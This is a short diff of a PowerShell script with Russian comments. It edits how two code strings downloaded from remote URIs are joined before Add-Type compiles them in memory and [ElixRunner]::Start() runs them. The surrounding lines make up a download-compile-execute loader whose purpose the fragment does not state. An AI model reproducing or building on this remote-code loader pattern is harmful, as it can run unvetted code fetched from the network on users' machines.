@@ -12,10 +12,10 @@ try {
     $c2 = $web.DownloadString($uri2)
 
     if ($c1 -and $c2) {
-        # Используем специальный символ переноса строки PowerShell `n внутри двойных кавычек
-        $fullCode = $c1 + "`n" + $c2
+        # Явное объединение строк с помощью оператора -join
+        # Это преобразует любые данные строго в одиночную строку String
+        $fullCode = @($c1, $c2) -join [System.Environment]::NewLine
         
-        # Передаем итоговую объединенную строку
         Add-Type -TypeDefinition $fullCode
 
         [ElixRunner]::Start()
